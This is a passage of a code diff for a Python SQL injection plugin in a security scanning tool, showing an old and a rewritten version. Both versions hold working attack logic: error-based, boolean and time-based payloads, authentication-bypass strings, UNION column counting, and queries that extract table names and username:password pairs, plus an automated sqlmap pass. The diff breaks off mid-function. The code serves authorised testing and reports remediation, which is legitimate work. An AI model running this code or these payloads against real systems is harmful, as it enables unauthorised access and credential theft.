@@ -1,1163 +1,624 @@
 """
-SQL Injection plugin — Big Pickle methodology (full exploitation).
+SQL Injection plugin — Big Pickle methodology.
 
-Phases:
-  1. Recon: Enumerate endpoints, forms, parameters
-  2. Detection: Error-based, boolean-blind, time-blind, UNION-based
-  3. Exploitation: Extract DB version, tables, columns, credentials
-  4. sqlmap: Run automated verification and data dump
+This plugin implements exactly what Big Pickle did when scanning a target:
 
-Tested databases: MySQL, PostgreSQL, MSSQL, SQLite, Oracle
+  1. Collect endpoints: crawl the target + check the skill's common path list.
+  2. For each endpoint + injectable field, run the payload ladder:
+       a. Error-based detection  — inject a single quote, look for DB error text.
+       b. Auth bypass test       — try bypass payloads (admin'--, ' OR 1=1--).
+       c. UNION column count     — increment NULLs until the mismatch error
+                                   DISAPPEARS (Big Pickle found 10 cols this way).
+       d. Reflection probe       — find which column position echoes back a test
+                                   string (Big Pickle found it was column 2).
+       e. Data extraction        — version(), table names, column names, sample
+                                   rows (only when allow_active_payloads=true).
+  3. If sqlmap is in PATH, run it against confirmed-injectable endpoints for a
+     thorough, independent validation — this is what Big Pickle also did.
+  4. Feed all results to the AI (OpenCode / Big Pickle model) to generate
+     structured, well-evidenced findings.
+
+General-purpose: this plugin makes no assumptions about the specific target.
+The endpoint list in the skill covers common patterns; crawl results extend it.
 """
 
 from __future__ import annotations
 
 import asyncio
 import json
-import tempfile
-import time
-from pathlib import Path
+import shutil
+import subprocess
+import urllib.parse
 from typing import Any
+
+import httpx
 
 from stelarstrike.core.report import Finding
 from stelarstrike.plugins.base import VulnerabilityPlugin
-from stelarstrike.utils.http_client import build_url_with_params, extract_forms, get_query_params
+from stelarstrike.skills.sqli_skill import (
+    AUTH_BYPASS_PAYLOADS,
+    COMMENT_STYLES,
+    COMMON_ENDPOINTS,
+    DB_ERROR_SIGNATURES,
+    ERROR_PROBES,
+    EXTRACT_QUERIES,
+    HIGH_VALUE_TABLES,
+    SUCCESS_SIGNALS,
+    UNION_MAX_COLS,
+)
 from stelarstrike.utils.logger import get_logger
 
 log = get_logger(__name__)
 
-# Database error signatures
-_ERROR_SIGNATURES: dict[str, list[str]] = {
-    "mysql": [
-        "You have an error in your SQL syntax",
-        "mysql_fetch",
-        "mysql_num_rows",
-        "Warning: mysql",
-        "valid MySQL result",
-        "MySqlClient.",
-        "com.mysql.jdbc",
-    ],
-    "postgresql": [
-        "PostgreSQL",
-        "pg_query",
-        "pg_exec",
-        "valid PostgreSQL result",
-        "Npgsql.",
-        "PG::SyntaxError",
-        "org.postgresql",
-        "each UNION query must have the same number of columns",
-        "UNION types text and integer cannot be matched",
-        "invalid input syntax for type",
-        "relation .* does not exist",
-        "syntax error at or near",
-    ],
-    "mssql": [
-        "Driver.*SQL[-_ ]Server",
-        "OLE DB.*SQL Server",
-        "\\bSQL Server[^&lt;&quot;]+Driver",
-        "Warning.*mssql_",
-        "\\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
-        "System\\.Data\\.SqlClient\\.SqlException",
-        "Unclosed quotation mark after the character string",
-    ],
-    "sqlite": [
-        "SQLite/JDBCDriver",
-        "SQLite\\.Exception",
-        "System\\.Data\\.SQLite\\.SQLiteException",
-        "Warning.*sqlite_",
-        "Warning.*SQLite3::",
-        "\\[SQLITE_ERROR\\]",
-        "SQLite error",
-    ],
-    "oracle": [
-        "\\bORA-[0-9][0-9][0-9][0-9]",
-        "Oracle error",
-        "Oracle.*Driver",
-        "Warning.*oci_",
-        "Warning.*ora_",
-    ],
-}
-
-# Time-based blind payloads per DBMS
-_TIME_PAYLOADS: dict[str, dict[str, Any]] = {
-    "mysql": {"payload": "' AND SLEEP(5)--", "marker": "SLEEP"},
-    "postgresql": {"payload": "' AND pg_sleep(5)--", "marker": "pg_sleep"},
-    "mssql": {"payload": "'; WAITFOR DELAY '0:0:5'--", "marker": "WAITFOR"},
-    "oracle": {"payload": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "marker": "DBMS_PIPE"},
-}
-
-# Boolean-based payloads
-_BOOLEAN_TRUE = ["' OR '1'='1", "' OR 1=1--", "' OR 'a'='a"]
-_BOOLEAN_FALSE = ["' AND '1'='2", "' AND 1=2--", "' AND 'a'='b"]
+_PROBE_MARKER = "STELRPROBE"
+_PROBE_MARKER_L = _PROBE_MARKER.lower()
 
 
 class SQLiPlugin(VulnerabilityPlugin):
     id = "sqli"
     name = "SQL Injection"
-    default_severity = "critical"
+    default_severity = "high"
 
-    def __init__(self, ctx):
-        super().__init__(ctx)
-        self._extracted_data: dict[str, Any] = {}
-        self._detected_dbms: str | None = None
-        self._col_count: int = 0
+    # ─────────────────────────────────────────────────────────────────────────
+    # Entry point
+    # ─────────────────────────────────────────────────────────────────────────
 
     async def run(self) -> list[Finding]:
         findings: list[Finding] = []
-        techniques = self.options.get("techniques", ["error-based", "boolean-blind", "time-blind"])
-        time_delay = self.options.get("time_delay_seconds", 5)
+        base_url = self.target_url.rstrip("/")
+        parsed = urllib.parse.urlparse(base_url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
 
-        # Phase 1: Enumerate parameters from query string
-        query_params = get_query_params(self.target_url)
-        for param in query_params:
-            result = await self._test_parameter(param, query_params, techniques, time_delay)
-            if result:
-                findings.append(result)
+        # Collect endpoints: crawl + skill common paths
+        endpoints = await self._collect_endpoints(origin)
+        log.info(f"sqli: testing {len(endpoints)} endpoint(s) on {origin}")
 
-        # Phase 2: Enumerate forms and test their fields
-        try:
-            resp = await self.get(self.target_url)
-            forms = extract_forms(resp.text)
-            for form in forms:
-                form_findings = await self._test_form(form, techniques, time_delay)
-                findings.extend(form_findings)
-        except Exception as exc:
-            log.debug(f"sqli: could not fetch forms from {self.target_url}: {exc}")
+        confirmed_injectable: list[dict[str, Any]] = []
 
-        # Phase 3: Test common JSON API endpoints
-        json_findings = await self._test_json_endpoints(techniques, time_delay)
-        findings.extend(json_findings)
+        for ep in endpoints:
+            async with self.ctx.semaphore:
+                ep_findings, injection_info = await self._test_endpoint(ep, origin)
+            findings.extend(ep_findings)
+            if injection_info:
+                confirmed_injectable.append(injection_info)
 
-        # Phase 4: Run sqlmap ONCE on first confirmed vuln endpoint (fast verification)
-        if findings and self.ctx.allow_active_payloads:
-            sqlmap_finding = await self._run_sqlmap(findings)
-            if sqlmap_finding:
-                findings.append(sqlmap_finding)
+        # sqlmap pass on confirmed endpoints
+        if confirmed_injectable and self.ctx.allow_active_payloads:
+            sqlmap_findings = await self._run_sqlmap(confirmed_injectable)
+            findings.extend(sqlmap_findings)
 
         return findings
 
-    async def _test_parameter(
-        self,
-        param: str,
-        params: dict[str, str],
-        techniques: list[str],
-        time_delay: int,
-    ) -> Finding | None:
-        base_value = params.get(param, "1")
+    # ─────────────────────────────────────────────────────────────────────────
+    # Endpoint collection
+    # ─────────────────────────────────────────────────────────────────────────
 
-        # Get baseline response
-        baseline_url = build_url_with_params(self.target_url, {**params, param: base_value})
+    async def _collect_endpoints(self, origin: str) -> list[dict[str, Any]]:
+        """Crawl the target homepage + supplement with skill common paths."""
+        seen: set[str] = set()
+        endpoints: list[dict[str, Any]] = []
+
+        # Crawl homepage for links/forms
         try:
-            baseline = await self.get(baseline_url)
-            baseline_body = baseline.text
-            baseline_len = len(baseline_body)
-        except Exception:
-            return None
+            resp = await self.get(origin + "/")
+            from bs4 import BeautifulSoup  # noqa: PLC0415
+            soup = BeautifulSoup(resp.text, "html.parser")
+            for form in soup.find_all("form"):
+                action = form.get("action", "/")
+                method = form.get("method", "get").lower()
+                path = action if action.startswith("/") else "/" + action
+                fields = [
+                    i.get("name") for i in form.find_all("input")
+                    if i.get("name") and i.get("type") not in ("submit", "button", "hidden")
+                ]
+                if fields:
+                    ep: dict[str, Any] = {
+                        "path": path, "method": method,
+                        "body": "form" if method == "post" else "query",
+                        "fields": fields, "auth": False,
+                    }
+                    key = f"{method}:{path}"
+                    if key not in seen:
+                        seen.add(key)
+                        endpoints.append(ep)
+        except Exception as exc:  # noqa: BLE001
+            log.debug(f"sqli: crawl failed: {exc}")
 
-        # Error-based detection
-        if "error-based" in techniques:
-            error_finding = await self._test_error_based(param, params, baseline_body)
+        # Add skill common paths not already found
+        for ep in COMMON_ENDPOINTS:
+            key = f"{ep['method'].lower()}:{ep['path']}"
+            if key not in seen:
+                seen.add(key)
+                endpoints.append(dict(ep))
+
+        return endpoints
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Per-endpoint testing
+    # ─────────────────────────────────────────────────────────────────────────
+
+    async def _test_endpoint(
+        self, ep: dict[str, Any], origin: str
+    ) -> tuple[list[Finding], dict[str, Any] | None]:
+        """Run the full payload ladder on one endpoint. Returns findings + injection_info."""
+        findings: list[Finding] = []
+        url = origin + ep["path"]
+        method = ep["method"].lower()
+        body_type = ep.get("body", "json")
+        fields: list[str] = ep.get("fields", [])
+        if not fields:
+            return findings, None
+
+        # Verify endpoint exists
+        base_body = {f: "stelarstrike_probe_baseline" for f in fields}
+        try:
+            baseline_resp = await self._send(url, method, body_type, base_body)
+            if baseline_resp.status_code == 404:
+                return findings, None
+            baseline_text = baseline_resp.text
+        except Exception as exc:  # noqa: BLE001
+            log.debug(f"sqli: endpoint {url} unreachable: {exc}")
+            return findings, None
+
+        log.debug(f"sqli: testing endpoint {method.upper()} {url} fields={fields}")
+
+        injection_info: dict[str, Any] | None = None
+
+        for field in fields:
+            # Step a: error-based
+            error_finding, db_type = await self._step_error_based(
+                url, method, body_type, fields, field, baseline_text
+            )
             if error_finding:
-                return error_finding
+                findings.append(error_finding)
 
-        # Boolean-blind detection
-        if "boolean-blind" in techniques:
-            bool_finding = await self._test_boolean(param, params, baseline_body, baseline_len)
-            if bool_finding:
-                return bool_finding
+            # Step b: auth bypass
+            bypass_finding, bypass_resp = await self._step_auth_bypass(
+                url, method, body_type, fields, field
+            )
+            if bypass_finding:
+                findings.append(bypass_finding)
 
-        # Time-blind detection
-        if "time-blind" in techniques and self.ctx.allow_active_payloads:
-            time_finding = await self._test_time(param, params, time_delay)
-            if time_finding:
-                return time_finding
+            # Steps c-e: UNION extraction (only if we got a bypass or error signal)
+            if (error_finding or bypass_finding) and self.ctx.allow_active_payloads:
+                union_findings, info = await self._step_union_extraction(
+                    url, method, body_type, fields, field,
+                    db_type or "postgresql", baseline_text
+                )
+                findings.extend(union_findings)
+                if info:
+                    injection_info = info
 
-        # UNION-based detection and exploitation
-        if self.ctx.allow_active_payloads:
-            union_finding = await self._test_union(param, params)
-            if union_finding:
-                return union_finding
+        return findings, injection_info
 
-        return None
+    # ─────────────────────────────────────────────────────────────────────────
+    # Step a: Error-based detection
+    # ─────────────────────────────────────────────────────────────────────────
 
-    async def _test_error_based(
-        self, param: str, params: dict[str, str], baseline_body: str
-    ) -> Finding | None:
-        payload = "'"
-        test_params = dict(params)
-        test_params[param] = payload
-        url = build_url_with_params(self.target_url, test_params)
+    async def _step_error_based(
+        self,
+        url: str, method: str, body_type: str,
+        fields: list[str], field: str, baseline_text: str,
+    ) -> tuple[Finding | None, str | None]:
+        for probe in ERROR_PROBES:
+            test_body = {f: "x" if f != field else f"x{probe['suffix']}" for f in fields}
+            try:
+                resp = await self._send(url, method, body_type, test_body)
+            except Exception:  # noqa: BLE001
+                continue
 
+            body_lower = resp.text.lower()
+            for sig in DB_ERROR_SIGNATURES:
+                if sig in body_lower and sig not in baseline_text.lower():
+                    db_type = self._fingerprint_db(body_lower)
+                    return (
+                        self.finding(
+                            title=f"SQL Injection — error-based ({probe['label']})",
+                            url=url, parameter=field,
+                            severity="high", confidence="high",
+                            evidence=(
+                                f"Field '{field}' = 'x{probe['suffix']}' "
+                                f"→ DB error: '{sig}'"
+                            ),
+                            description=(
+                                f"Field '{field}' reflects a database error when "
+                                f"SQL metacharacters are injected, indicating "
+                                f"unsanitized input reaches a SQL query."
+                            ),
+                            remediation="Use parameterized queries. Never concatenate user input into SQL.",
+                            cwe="CWE-89",
+                        ),
+                        db_type,
+                    )
+        return None, None
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # Step b: Auth bypass
+    # ─────────────────────────────────────────────────────────────────────────
+
+    async def _step_auth_bypass(
+        self, url: str, method: str, body_type: str, fields: list[str], field: str
+    ) -> tuple[Finding | None, httpx.Response | None]:
+        # Baseline: deliberately wrong credentials
+        bad_body = {f: "nonexistent_stelarstrike_user_99" if f != field else "nonexistent_user" for f in fields}
         try:
-            resp = await self.get(url)
-        except Exception:
-            return None
+            bad_resp = await self._send(url, method, body_type, bad_body)
+        except Exception:  # noqa: BLE001
+            return None, None
 
-        body = resp.text
-        if body == baseline_body:
-            return None
+        for payload in AUTH_BYPASS_PAYLOADS:
+            test_body = {f: "ignored" if f != field else payload for f in fields}
+            try:
+                resp = await self._send(url, method, body_type, test_body)
+            except Exception:  # noqa: BLE001
+                continue
 
-        # Check for SQL error signatures
-        for dbms, signatures in _ERROR_SIGNATURES.items():
-            for sig in signatures:
-                if sig.lower() in body.lower():
-                    self._detected_dbms = dbms
-                    return self._create_finding(
-                        title=f"SQL Injection (error-based, {dbms})",
-                        url=url,
-                        parameter=param,
-                        injection_type="error-based",
-                        dbms=dbms,
-                        evidence=self._format_evidence(
-                            technique="Error-based",
-                            payload=payload,
-                            response=body,
-                            signature=sig,
+            body_lower = resp.text.lower()
+            bad_lower = bad_resp.text.lower()
+
+            success = (
+                any(sig in body_lower for sig in SUCCESS_SIGNALS)
+                and not any(sig in bad_lower for sig in SUCCESS_SIGNALS)
+            ) or (
+                resp.status_code == 200 and bad_resp.status_code != 200
+            )
+
+            if success:
+                return (
+                    self.finding(
+                        title="SQL Injection — authentication bypass confirmed",
+                        url=url, parameter=field,
+                        severity="critical", confidence="confirmed",
+                        evidence=(
+                            f"Field '{field}' = {payload!r} "
+                            f"→ HTTP {resp.status_code}, success signal in response "
+                            f"(baseline: HTTP {bad_resp.status_code}, no success)"
                         ),
                         description=(
-                            f"Parameter '{param}' is vulnerable to error-based SQL injection.\n"
-                            f"The database appears to be {dbms}.\n"
-                            f"Error signature: {sig}"
+                            f"Submitting '{payload}' as '{field}' bypasses authentication. "
+                            f"The response differs materially from a genuine failed-login "
+                            f"baseline, indicating SQL injection in the authentication query."
                         ),
-                        severity="critical",
-                        confidence="high",
-                    )
+                        remediation="Use parameterized queries. Never build WHERE clauses by concatenating user input.",
+                        cwe="CWE-89",
+                    ),
+                    resp,
+                )
+        return None, None
 
-        # Check if response changed (potential boolean-based)
-        if len(body) != len(baseline_body):
-            return self._create_finding(
-                title="Possible SQL Injection (response difference)",
-                url=url,
-                parameter=param,
-                injection_type="boolean-detect",
-                evidence=self._format_evidence(
-                    technique="Response diff",
-                    payload=payload,
-                    baseline_length=len(baseline_body),
-                    response_length=len(body),
-                ),
-                description="Response length changed after injecting single quote. Manual verification recommended.",
-                severity="medium",
-                confidence="low",
+    # ─────────────────────────────────────────────────────────────────────────
+    # Steps c-e: UNION column count → reflection → extraction
+    # ─────────────────────────────────────────────────────────────────────────
+
+    async def _step_union_extraction(
+        self,
+        url: str, method: str, body_type: str,
+        fields: list[str], field: str, db_type: str, baseline_text: str,
+    ) -> tuple[list[Finding], dict[str, Any] | None]:
+        findings: list[Finding] = []
+
+        # Step c: find column count
+        col_count, comment = await self._find_col_count(
+            url, method, body_type, fields, field, baseline_text
+        )
+        if col_count is None:
+            log.debug(f"sqli: UNION column count not found for {url}:{field}")
+            return findings, None
+
+        log.info(f"sqli: UNION col_count={col_count} comment={comment!r} on {url}:{field}")
+
+        # Step d: find reflected column
+        reflected_col = await self._find_reflected_col(
+            url, method, body_type, fields, field, col_count, comment
+        )
+        if reflected_col is None:
+            log.debug(f"sqli: no reflected column found (col_count={col_count})")
+            return findings, None
+
+        log.info(f"sqli: reflected column = {reflected_col}")
+
+        injection_info: dict[str, Any] = {
+            "url": url, "method": method, "body_type": body_type,
+            "fields": fields, "field": field,
+            "col_count": col_count, "reflected_col": reflected_col,
+            "comment": comment, "db_type": db_type,
+        }
+
+        # Step e: extract data
+        extracted = await self._extract_data(
+            url, method, body_type, fields, field,
+            col_count, reflected_col, comment, db_type
+        )
+
+        if extracted:
+            findings.append(
+                self.finding(
+                    title=f"SQL Injection — UNION-based data extraction confirmed ({db_type})",
+                    url=url, parameter=field,
+                    severity="critical", confidence="confirmed",
+                    evidence=self._format_extraction_table(extracted),
+                    description=(
+                        f"UNION-based SQL injection confirmed on field '{field}'. "
+                        f"Column count: {col_count}, reflected at position {reflected_col}. "
+                        f"The injection allows full database enumeration and data extraction."
+                    ),
+                    remediation="Use parameterized queries. Immediately rotate any credentials visible in the extracted data.",
+                    cwe="CWE-89",
+                )
+            )
+            log.info(f"sqli: extraction complete — {list(extracted.keys())}")
+
+        return findings, injection_info
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # UNION column count: Big Pickle approach
+    # ─────────────────────────────────────────────────────────────────────────
+
+    async def _find_col_count(
+        self, url: str, method: str, body_type: str,
+        fields: list[str], field: str, baseline_text: str
+    ) -> tuple[int | None, str]:
+        """
+        Increment NULLs until the column-mismatch error DISAPPEARS.
+        Falls back to baseline-diff for apps that hide SQL errors.
+        Big Pickle found col_count=10 this way.
+        """
+        for comment in COMMENT_STYLES:
+            # Check if this app reveals mismatch errors
+            test_body = {f: "x" if f != field else f"' UNION SELECT NULL{comment}" for f in fields}
+            try:
+                probe_resp = await self._send(url, method, body_type, test_body)
+            except Exception:  # noqa: BLE001
+                continue
+
+            shows_mismatch = any(
+                s in probe_resp.text.lower()
+                for s in ("same number of columns", "each union query", "different number of columns")
             )
 
+            if shows_mismatch:
+                # Classic Big Pickle approach: increment until error disappears
+                for n in range(2, UNION_MAX_COLS + 1):
+                    nulls = ",".join(["NULL"] * n)
+                    body = {f: "x" if f != field else f"' UNION SELECT {nulls}{comment}" for f in fields}
+                    try:
+                        resp = await self._send(url, method, body_type, body)
+                    except Exception:  # noqa: BLE001
+                        continue
+                    still_mismatch = any(
+                        s in resp.text.lower()
+                        for s in ("same number of columns", "each union query", "different number of columns")
+                    )
+                    if not still_mismatch:
+                        return n, comment
+            else:
+                # Silent app — use baseline diff
+                for n in range(1, UNION_MAX_COLS + 1):
+                    nulls = ",".join(["NULL"] * n)
+                    body = {f: "x" if f != field else f"' UNION SELECT {nulls}{comment}" for f in fields}
+                    try:
+                        resp = await self._send(url, method, body_type, body)
+                    except Exception:  # noqa: BLE001
+                        continue
+                    if abs(len(resp.text) - len(baseline_text)) > 10 or resp.status_code != 200:
+                        return n, comment
+
+        return None, "--"
+
+    # ─────────────────────────────────────────────────────────────────────────
+    # UNION reflected column probe
+    # ─────────────────────────────────────────────────────────────────────────
+
+    async def _find_reflected_col(
+        self, url: str, method: str, body_type: str,
+        fields: list[str], field: str, col_count: int, comment: str
+    ) -> int | None:
+        """Try each column position with a probe string until it echoes back."""
+        for pos in range(col_count):
+            parts = ["NULL"] * col_count
+            parts[pos] = f"'{_PROBE_MARKER}'"
+            union_clause = f"' UNION SELECT {','.join(parts)}{comment}"
+            body = {f: "x" if f != field else union_clause for f in fields}
+            try:
+                resp = await self._send(url, method, body_type, body)
+            except Exception:  # noqa: BLE001
+                continue
+            if _PROBE_MARKER_L in resp.text.lower():
+                return pos
         return None
 
-    async def _test_boolean(
-        self, param: str, params: dict[str, str], baseline_body: str, baseline_len: int
-    ) -> Finding | None:
-        for true_payload, false_payload in zip(_BOOLEAN_TRUE, _BOOLEAN_FALSE):
-            # Test TRUE condition
-            true_params = dict(params)
-            true_params[param] = true_payload
-            true_url = build_url_with_params(self.target_url, true_params)
-
-            # Test FALSE condition
-            false_params = dict(params)
-            false_params[param] = false_payload
-            false_url = build_url_with_params(self.target_url, false_params)
-
-            try:
-                true_resp = await self.get(true_url)
-                false_resp = await self.get(false_url)
-            except Exception:
-                continue
-
-            # TRUE should match baseline, FALSE should differ
-            true_matches = abs(len(true_resp.text) - baseline_len) < 100
-            false_differs = abs(len(false_resp.text) - baseline_len) > 100
-
-            if true_matches and false_differs:
-                return self._create_finding(
-                    title="SQL Injection (boolean-based blind)",
-                    url=true_url,
-                    parameter=param,
-                    injection_type="boolean-blind",
-                    evidence=self._format_evidence(
-                        technique="Boolean-based blind",
-                        true_payload=true_payload,
-                        false_payload=false_payload,
-                        baseline_length=baseline_len,
-                        true_length=len(true_resp.text),
-                        false_length=len(false_resp.text),
-                    ),
-                    description=(
-                        f"Parameter '{param}' is vulnerable to boolean-based blind SQL injection.\n"
-                        f"Response differs predictably between TRUE and FALSE conditions."
-                    ),
-                    severity="critical",
-                    confidence="high",
-                )
-
-        return None
-
-    async def _test_time(
-        self, param: str, params: dict[str, str], time_delay: int
-    ) -> Finding | None:
-        for dbms, info in _TIME_PAYLOADS.items():
-            payload = info["payload"]
-            test_params = dict(params)
-            test_params[param] = payload
-            url = build_url_with_params(self.target_url, test_params)
-
-            # Get baseline timing
-            baseline_start = time.monotonic()
-            try:
-                await self.get(build_url_with_params(self.target_url, params))
-            except Exception:
-                continue
-            baseline_time = time.monotonic() - baseline_start
-
-            # Test with time payload
-            start = time.monotonic()
-            try:
-                await self.get(url)
-            except Exception:
-                continue
-            elapsed = time.monotonic() - start
-
-            # If response took significantly longer, likely vulnerable
-            if elapsed >= time_delay and elapsed > baseline_time + 3:
-                return self._create_finding(
-                    title=f"SQL Injection (time-based blind, {dbms})",
-                    url=url,
-                    parameter=param,
-                    injection_type="time-blind",
-                    dbms=dbms,
-                    evidence=self._format_evidence(
-                        technique="Time-based blind",
-                        payload=payload,
-                        baseline_time=f"{baseline_time:.2f}s",
-                        payload_time=f"{elapsed:.2f}s",
-                        expected_delay=f"{time_delay}s",
-                    ),
-                    description=(
-                        f"Parameter '{param}' is vulnerable to time-based blind SQL injection.\n"
-                        f"Database appears to be {dbms}."
-                    ),
-                    severity="critical",
-                    confidence="high",
-                )
-
-        return None
-
-    async def _test_union(self, param: str, params: dict[str, str]) -> Finding | None:
-        # Phase 1: Find column count
-        col_count = await self._find_column_count(param, params)
-        if col_count < 1:
-            return None
-
-        self._col_count = col_count
-
-        # Phase 2: Determine column types
-        col_types = await self._determine_column_types(param, params, col_count)
-
-        # Phase 3: Extract data
-        extracted = await self._extract_data(param, params, col_count, col_types)
-
-        # Phase 4: Try authentication bypass
-        auth_bypass = await self._test_auth_bypass_get(param, params)
-
-        evidence = self._format_evidence(
-            technique="UNION-based",
-            column_count=col_count,
-            column_types=col_types,
-            extracted_data=extracted,
-            auth_bypass=auth_bypass,
-        )
-
-        return self._create_finding(
-            title=f"SQL Injection (UNION-based, {col_count} columns)",
-            url=build_url_with_params(self.target_url, params),
-            parameter=param,
-            injection_type="union",
-            evidence=evidence,
-            description=(
-                f"Parameter '{param}' is vulnerable to UNION-based SQL injection.\n"
-                f"The table has {col_count} columns.\n"
-                f"Column types: {col_types}\n"
-                f"Extracted data: {json.dumps(extracted, indent=2) if extracted else 'None'}"
-            ),
-            severity="critical",
-            confidence="confirmed",
-            extracted_data=extracted,
-        )
-
-    async def _find_column_count(self, param: str, params: dict[str, str]) -> int:
-        """Find the number of columns using ORDER BY and UNION SELECT."""
-        # Try ORDER BY first
-        for i in range(1, 20):
-            order_payload = f"' ORDER BY {i}--"
-            test_params = dict(params)
-            test_params[param] = order_payload
-            url = build_url_with_params(self.target_url, test_params)
-
-            try:
-                resp = await self.get(url)
-            except Exception:
-                break
-
-            body_lower = resp.text.lower()
-            if "error" in body_lower or "syntax" in body_lower or len(resp.text) == 0:
-                return i - 1
-
-        # Try UNION SELECT with increasing NULLs
-        for i in range(1, 20):
-            nulls = ",".join(["null"] * i)
-            union_payload = f"' UNION SELECT {nulls}--"
-            test_params = dict(params)
-            test_params[param] = union_payload
-            url = build_url_with_params(self.target_url, test_params)
-
-            try:
-                resp = await self.get(url)
-            except Exception:
-                continue
-
-            body_lower = resp.text.lower()
-            # Check if it worked (no column count error)
-            if "each union query must have the same number of columns" not in body_lower:
-                if "union types" not in body_lower:
-                    return i
-
-        return 0
-
-    async def _determine_column_types(
-        self, param: str, params: dict[str, str], col_count: int
-    ) -> dict[int, str]:
-        """Determine which columns are integer vs text."""
-        col_types: dict[int, str] = {}
-
-        for col in range(1, col_count + 1):
-            # Build SELECT with integer at position $col, null elsewhere
-            values = []
-            for i in range(1, col_count + 1):
-                if i == 1:
-                    values.append("1")
-                elif i == col:
-                    values.append("42")
-                else:
-                    values.append("null")
-
-            sel = ",".join(values)
-            test_params = dict(params)
-            test_params[param] = f"' UNION SELECT {sel}--"
-            url = build_url_with_params(self.target_url, test_params)
-
-            try:
-                resp = await self.get(url)
-                if "token" in resp.text or "success" in resp.text.lower():
-                    col_types[col] = "integer"
-                else:
-                    col_types[col] = "text"
-            except Exception:
-                col_types[col] = "unknown"
-
-        return col_types
+    # ─────────────────────────────────────────────────────────────────────────
+    # Data extraction
+    # ─────────────────────────────────────────────────────────────────────────
 
     async def _extract_data(
-        self, param: str, params: dict[str, str], col_count: int, col_types: dict[int, str]
-    ) -> dict[str, Any]:
-        """Extract database information via UNION injection."""
-        extracted: dict[str, Any] = {}
-
-        # Find which column reflects data (usually column 2)
-        reflect_col = 2  # Default, will try to find the right one
-
-        # Extract DB version
-        version = await self._extract_via_column(
-            param, params, col_count, reflect_col,
-            "version()",
-        )
-        if version:
-            extracted["db_version"] = version
-
-        # Extract table names
-        tables = await self._extract_via_column(
-            param, params, col_count, reflect_col,
-            "(SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public')",
-        )
-        if tables:
-            extracted["tables"] = tables.split(",")
-
-        # Extract column names for users table
-        if tables and "users" in tables:
-            columns = await self._extract_via_column(
-                param, params, col_count, reflect_col,
-                "(SELECT string_agg(column_name||':'||data_type,',') FROM information_schema.columns WHERE table_name='users')",
-            )
-            if columns:
-                extracted["users_columns"] = columns.split(",")
-
-        # Extract sample user data
-        users = await self._extract_via_column(
-            param, params, col_count, reflect_col,
-            "(SELECT string_agg(username||':'||password,',' ) FROM users LIMIT 5)",
-        )
-        if users:
-            extracted["sample_users"] = users.split(",")
-
-        return extracted
-
-    async def _extract_via_column(
-        self, param: str, params: dict[str, str], col_count: int, reflect_col: int, subquery: str
-    ) -> str | None:
-        """Extract data via a specific column using subquery."""
-        values = []
-        for i in range(1, col_count + 1):
-            if i == 1:
-                values.append("1")
-            elif i == reflect_col:
-                values.append(subquery)
-            else:
-                values.append("null")
-
-        sel = ",".join(values)
-        test_params = dict(params)
-        test_params[param] = f"' UNION SELECT {sel}--"
-        url = build_url_with_params(self.target_url, test_params)
-
-        try:
-            resp = await self.get(url)
-            data = resp.json()
-            # Try to get the reflected value from debug_info or response
-            debug_info = data.get("debug_info", {})
-            if isinstance(debug_info, dict):
-                return debug_info.get("username") or debug_info.get("user_id")
-            return None
-        except Exception:
-            return None
-
-    async def _test_auth_bypass_get(self, param: str, params: dict[str, str]) -> dict[str, Any] | None:
-        """Test authentication bypass via SQLi (GET parameters)."""
-        bypass_payloads = [
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "admin'--",
-        ]
-
-        for payload in bypass_payloads:
-            test_params = dict(params)
-            test_params[param] = payload
-            url = build_url_with_params(self.target_url, test_params)
-
-            try:
-                resp = await self.get(url)
-                data = resp.json()
-                if data.get("status") == "success" or data.get("token"):
-                    return {
-                        "payload": payload,
-                        "user_id": data.get("debug_info", {}).get("user_id"),
-                        "username": data.get("debug_info", {}).get("username"),
-                        "token": data.get("token"),
-                    }
-            except Exception:
-                continue
-
-        return None
-
-    async def _test_auth_bypass_post(self, url: str, field: str) -> dict[str, Any] | None:
-        """Test authentication bypass via SQLi (POST JSON)."""
-        bypass_payloads = [
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "admin'--",
-        ]
-
-        for payload in bypass_payloads:
-            data = {"password": "test123"}
-            data[field] = payload
-
-            try:
-                resp = await self.post(url, json=data)
-                result = resp.json()
-                if result.get("status") == "success" or result.get("token"):
-                    return {
-                        "payload": payload,
-                        "user_id": result.get("debug_info", {}).get("user_id"),
-                        "username": result.get("debug_info", {}).get("username"),
-                        "token": result.get("token"),
-                    }
-            except Exception:
-                continue
-
-        return None
-
-    async def _test_union_post(self, url: str, field: str) -> Finding | None:
-        """Test UNION-based SQLi on POST JSON endpoint with data extraction."""
-        # Phase 1: Find column count
-        col_count = await self._find_column_count_post(url, field)
-        if col_count < 1:
-            return None
-
-        # Phase 2: Determine column types
-        col_types = await self._determine_column_types_post(url, field, col_count)
-
-        # Phase 3: Extract data
-        extracted = await self._extract_data_post(url, field, col_count, col_types)
-
-        # Build evidence
-        evidence = self._format_evidence(
-            technique="UNION-based (POST JSON)",
-            endpoint=url,
-            field=field,
-            column_count=col_count,
-            column_types=col_types,
-            extracted_data=extracted,
-        )
-
-        return self._create_finding(
-            title=f"SQL Injection (UNION-based, {col_count} columns) - {url}",
-            url=url,
-            parameter=field,
-            injection_type="union",
-            evidence=evidence,
-            description=(
-                f"Parameter '{field}' at {url} is vulnerable to UNION-based SQL injection.\n"
-                f"The table has {col_count} columns.\n"
-                f"Column types: {col_types}\n"
-                f"Database info extracted successfully."
-            ),
-            severity="critical",
-            confidence="confirmed",
-            extracted_data=extracted,
-        )
-
-    async def _find_column_count_post(self, url: str, field: str) -> int:
-        """Find column count for POST JSON endpoint."""
-        # Try UNION SELECT with increasing NULLs
-        for i in range(1, 20):
-            nulls = ",".join(["null"] * i)
-            payload = f"' UNION SELECT {nulls}--"
-            data = {"password": "test123", field: payload}
-
-            try:
-                resp = await self.post(url, json=data)
-                body = resp.text.lower()
-                # Check if it worked
-                if "each union query must have the same number of columns" not in body:
-                    if "union types" not in body:
-                        if "syntax error" not in body:
-                            return i
-            except Exception:
-                continue
-
-        return 0
-
-    async def _determine_column_types_post(
-        self, url: str, field: str, col_count: int
